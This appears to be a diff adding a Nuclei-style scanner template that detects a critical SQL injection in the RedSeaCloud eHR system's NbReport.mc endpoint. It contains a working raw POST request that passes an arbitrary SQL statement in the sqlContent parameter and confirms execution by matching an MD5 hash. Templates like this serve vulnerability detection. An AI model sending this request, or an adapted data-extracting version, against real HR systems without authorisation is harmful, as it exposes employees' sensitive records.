@@ -1,0 +1,31 @@
+id: redseacloud-ehr-nbreport-sqli
+info:
+  name: RedSeaCloud eHR NbReport SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The Red Sea eHR system contains a SQL injection vulnerability that allows attackers to obtain database permissions and sensitive information.
+  reference:
+    - https://www.hr-soft.cn/
+  classification:
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  tags: sql_injection
+http:
+  - raw:
+      - |
+        POST /RedseaPlatform/NbReport.mc HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: redseaUserInfo=1;REDSESSIONID=1
+
+        method=getDataList&sqlType=1&sqlContent=select md5(232);
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "be83ab3ecd0db773eb2dc1b0a17836a1"
+        part: body
